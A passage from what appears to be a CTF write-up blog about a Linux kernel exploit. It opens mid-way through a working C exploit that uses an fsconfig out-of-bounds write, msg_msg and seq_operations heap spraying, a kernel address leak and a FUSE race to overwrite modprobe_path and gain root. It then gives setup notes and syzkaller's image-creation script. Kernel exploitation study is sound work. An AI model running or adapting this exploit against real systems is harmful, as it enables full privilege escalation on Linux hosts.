class="keyword">sizeof</span>(primary_msg) - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">        ret = msgsnd(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, MSG_TAG);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ret);</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to open /proc/self/stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fs_fd[<span class="number">0</span>] = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd[<span class="number">0</span>] &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to fsopen!&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">        fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;aaaaaaa&quot;</span>, <span class="string">&quot;bbbbbbb&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;0x196082&quot;</span>, <span class="string">&quot;pwned&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = MSG_QUEUE_NUM / <span class="number">2</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;primary_msg.mtext, <span class="string">&#x27;A&#x27;</span> + i, <span class="keyword">sizeof</span>(primary_msg) - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, MSG_TAG) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to open /proc/self/stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] oob write to overwrite m_ts of one msg_msg...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(m_ts_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(m_ts_buf));</span><br><span class="line">    *((<span class="keyword">long</span> *)m_ts_buf) = <span class="number">0xfd0</span> + <span class="number">0xff0</span>;</span><br><span class="line">    fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;196082196082196082ya7&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, m_ts_buf, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray more seq_operations...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = MSG_QUEUE_NUM; i &lt; SEQ_FILE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to open /proc/self/stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for oob reading...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> recv_size;</span><br><span class="line">        <span class="comment">// memset(buf, &#x27;\0&#x27;, 0xfd0 + 0xfd0);</span></span><br><span class="line">        recv_size = msgrcv(msqid[i], buf, <span class="number">0xfd0</span> + <span class="number">0xff0</span> - <span class="number">8</span> + <span class="number">0x10</span>, <span class="number">0</span>, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">        <span class="keyword">if</span> (recv_size &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error code :%d\n&quot;</span>, recv_size);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error index:%d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to msgrcv(MSG_COPY)!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (recv_size == (<span class="number">0xfd0</span> + <span class="number">0x18</span>))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; (<span class="number">0xfd0</span> + <span class="number">0xfd0</span>); j += <span class="number">8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)(buf + j) &gt; kernel_base &amp;&amp; (*(<span class="keyword">uint64_t</span> *)(buf + j) &amp; <span class="number">0xfff</span>) == <span class="number">0x140</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] get data leak: %p\n&quot;</span>, *(<span class="keyword">uint64_t</span> *)(buf + j));</span><br><span class="line">                kernel_addr = *(<span class="keyword">uint64_t</span> *)(buf + j);</span><br><span class="line">                kernel_base = kernel_addr - <span class="number">0x36f140</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kernel_addr != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_addr == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to leak kernel base!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    modprobe_path = <span class="number">0xffffffff82891780</span> + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] modprobe_path: %lx\n&quot;</span>, modprobe_path);</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[<span class="number">1</span>], &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    prepare_mod();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> evil_file_fd;</span><br><span class="line">    <span class="keyword">int</span> ms_qid;</span><br><span class="line"></span><br><span class="line">    evil_file_fd = open(<span class="string">&quot;./temp/evil&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (evil_file_fd &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] FAILED to open evil file in FUSE!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *nearby_page = (<span class="keyword">char</span> *)mmap((<span class="keyword">void</span> *)<span class="number">0x1337000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *evil_page = (<span class="keyword">char</span> *)mmap((<span class="keyword">void</span> *)<span class="number">0x1338000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                                   MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (evil_page != (<span class="keyword">char</span> *)<span class="number">0x1338000</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] FAILED to map for FUSE file!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(nearby_page, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;try %d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((ms_qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        exp_fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (exp_fs_fd &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to fsopen!&quot;</span>);</span><br><span class="line">        <span class="comment">// write(pipe_fd[1], &amp;exp_fs_fd, 4);</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">            fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;aaaaaaa&quot;</span>, <span class="string">&quot;bbbbbbb&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;0x196082&quot;</span>, <span class="string">&quot;pwned&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">pthread_t</span> thr;</span><br><span class="line">        pthread_create(&amp;thr, <span class="literal">NULL</span>, change_next, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(ms_qid, evil_page - <span class="number">0xfd0</span> + <span class="number">0x8</span>, <span class="number">0xfd0</span> + <span class="number">0x18</span>, MSG_TAG) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        pthread_join(thr, <span class="literal">NULL</span>);</span><br><span class="line">        i++;</span><br><span class="line">        system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (flag_fd &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] Successfully overwrite the modprobe_path!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="è¸©å‘è®°"><a href="#è¸©å‘è®°" class="headerlink" title="è¸©å‘è®°"></a>è¸©å‘è®°</h3><p>é¦–å…ˆåœ¨è™šæ‹Ÿæœºä¸­è·‘<code>FUSE</code>æ—¶è¸©äº†ä¸€ä¸ªå¤§å‘ï¼Œåœ¨ä¸€ç¯‡æ–‡ç« ä¸­( è¿™é‡Œæåˆ°çš„æ–‡ç« å°±ä¸æ”¾å‡ºæ¥äº†ï¼Œå¯èƒ½æ˜¯å¸ˆå‚…ä»¬ä¸å°å¿ƒå†™é”™äº† )æŒ‡å‡º<code>FUSE</code>æ— æ³•åœ¨ctfç¯å¢ƒä¸­è¿è¡Œæ˜¯å› ä¸º<code>bzImage</code>çš„é—®é¢˜ï¼Œç»è¿‡è¯¢é—®å‘ç°å…¶é—®é¢˜ä¸»è¦æ˜¯æ–‡ä»¶ç³»ç»Ÿè¿‡äºæ®‹ç¼ºå¯¼è‡´çš„ã€‚éšåå¬å–a3ä½¬çš„æ„è§æ›´å¤šçš„å­¦ä¹ äº†fuseåŸç†ä¹‹åæˆåŠŸè§£å†³äº†é—®é¢˜ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>syzkaller</code>ä¸­çš„å·¥å…·ä½¿ç”¨<code>debootstrap</code>æ­å»ºçš„ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># Copyright 2016 syzkaller project authors. All rights reserved.</span></span><br><span class="line"><span class="comment"># Use of this source code is governed by Apache 2 LICENSE that can be found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create-image.sh creates a minimal Debian Linux image suitable for syzkaller.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -eux</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a minimal Debian distribution in a directory.</span></span><br><span class="line">DIR=chroot</span><br><span class="line">PREINSTALL_PKGS=openssh-server,curl,tar,gcc,libc6-dev,time,strace,sudo,less,psmisc,selinux-utils,policycoreutils,checkpolicy,selinux-policy-default,firmware-atheros,debian-ports-archive-keyring,libselinux1-dev,fuse3,libfuse3-3,libfuse3-dev,libfuse2,libfuse-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># If ADD_PACKAGE is not defined as an external environment variable, use our default packages</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$&#123;ADD_PACKAGE+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">    ADD_PACKAGE=<span class="string">&quot;make,sysbench,git,vim,tmux,usbutils,tcpdump&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Variables affected by options</span></span><br><span class="line">ARCH=$(uname -m)</span><br><span class="line">RELEASE=bullseye</span><br><span class="line">FEATURE=minimal</span><br><span class="line">SEEK=2047</span><br><span class="line">PERF=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Display help function</span></span><br><span class="line"><span class="function"><span class="title">display_help</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> [option...] &quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -a, --arch                 Set architecture&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -d, --distribution         Set on which debian distribution to create&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -f, --feature              Check what packages to install in the image, options are minimal, full&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -s, --seek                 Image size (MB), default 2048 (2G)&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -h, --help                 Display help message&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -p, --add-perf             Add perf support with this option enabled. Please set envrionment variable \$KERNEL at first&quot;</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$#</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">        -h | --<span class="built_in">help</span>)</span><br><span class="line">            display_help</span><br><span class="line">            <span class="built_in">exit</span> 0</span><br><span class="line">        ;;</span><br><span class="line">        -a | --arch)</span><br><span class="line">            ARCH=<span class="variable">$2</span></span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -d | --distribution)</span><br><span class="line">            RELEASE=<span class="variable">$2</span></span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -f | --feature)</span><br><span class="line">            FEATURE=<span class="variable">$2</span></span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -s | --seek)</span><br><span class="line">            SEEK=$((<span class="variable">$2</span> - <span class="number">1</span>))</span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -p | --add-perf)</span><br><span class="line">            PERF=<span class="literal">true</span></span><br><span class="line">            <span class="built_in">shift</span> 1</span><br><span class="line">        ;;</span><br><span class="line">        -*)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Error: Unknown option: <span class="variable">$1</span>&quot;</span> &gt;&amp;2</span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">        ;;</span><br><span class="line">        *)  <span class="comment"># No more options</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Handle cases where qemu and Debian use different arch names</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$ARCH</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    ppc64le)</span><br><span class="line">        DEBARCH=ppc64el</span><br><span class="line">    ;;</span><br><span class="line">    aarch64)</span><br><span class="line">        DEBARCH=arm64</span><br><span class="line">    ;;</span><br><span class="line">    arm)</span><br><span class="line">        DEBARCH=armel</span><br><span class="line">    ;;</span><br><span class="line">    x86_64)</span><br><span class="line">        DEBARCH=amd64</span><br><span class="line">    ;;</span><br><span class="line">    *)</span><br><span class="line">        DEBARCH=<span class="variable">$ARCH</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Foreign architecture</span></span><br><span class="line"></span><br><span class="line">FOREIGN=<span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$ARCH</span> != $(uname -m) ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># i386 on an x86_64 host is exempted, as we can run i386 binaries natively</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$ARCH</span> != <span class="string">&quot;i386&quot;</span> -o $(uname -m) != <span class="string">&quot;x86_64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        FOREIGN=<span class="literal">true</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># Check for according qemu static binary</span></span><br><span class="line">    <span class="keyword">if</span> ! <span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Please install qemu static binary for architecture <span class="variable">$ARCH</span> (package &#x27;qemu-user-static&#x27; on Debian/Ubuntu/Fedora)&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="comment"># Check for according binfmt entry</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -r /proc/sys/fs/binfmt_misc/qemu-<span class="variable">$ARCH</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;binfmt entry /proc/sys/fs/binfmt_misc/qemu-<span class="variable">$ARCH</span> does not exist&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Double check KERNEL when PERF is enabled</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$PERF</span> = <span class="string">&quot;true&quot;</span> ] &amp;&amp; [ -z <span class="variable">$&#123;KERNEL+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Please set KERNEL environment variable when PERF is enabled&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If full feature is chosen, install more packages</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FEATURE</span> = <span class="string">&quot;full&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    PREINSTALL_PKGS=<span class="variable">$PREINSTALL_PKGS</span><span class="string">&quot;,&quot;</span><span class="variable">$ADD_PACKAGE</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">sudo rm -rf <span class="variable">$DIR</span></span><br><span class="line">sudo mkdir -p <span class="variable">$DIR</span></span><br><span class="line">sudo chmod 0755 <span class="variable">$DIR</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. debootstrap stage</span></span><br><span class="line"></span><br><span class="line">DEBOOTSTRAP_PARAMS=<span class="string">&quot;--arch=<span class="variable">$DEBARCH</span> --no-check-gpg --include=<span class="variable">$PREINSTALL_PKGS</span> --components=main,contrib,non-free,non-free-firmware <span class="variable">$RELEASE</span> <span class="variable">$DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    DEBOOTSTRAP_PARAMS=<span class="string">&quot;--foreign <span class="variable">$DEBOOTSTRAP_PARAMS</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># riscv64 is hosted in the debian-ports repository</span></span><br><span class="line"><span class="comment"># debian-ports doesn&#x27;t include non-free, so we exclude firmware-atheros</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$DEBARCH</span> == <span class="string">&quot;riscv64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    DEBOOTSTRAP_PARAMS=<span class="string">&quot;--keyring /usr/share/keyrings/debian-ports-archive-keyring.gpg --exclude firmware-atheros <span class="variable">$DEBOOTSTRAP_PARAMS</span> http://deb.debian.org/debian-ports&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">sudo --preserve-env=http_proxy,https_proxy,ftp_proxy,no_proxy debootstrap <span class="variable">$DEBOOTSTRAP_PARAMS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. debootstrap stage: only necessary if target != host architecture</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    sudo cp $(<span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static) <span class="variable">$DIR</span>/$(<span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static)</span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;/debootstrap/debootstrap --second-stage&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set some defaults and enable promtless ssh to the machine for root.</span></span><br><span class="line">sudo sed -i <span class="string">&#x27;/^root/ &#123; s/:x:/::/ &#125;&#x27;</span> <span class="variable">$DIR</span>/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/inittab</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;\nauto eth0\niface eth0 inet dhcp\n&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/network/interfaces</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/dev/root / ext4 defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;debugfs /sys/kernel/debug debugfs defaults 0 0&#x27;</span> | sudo tee -a <span 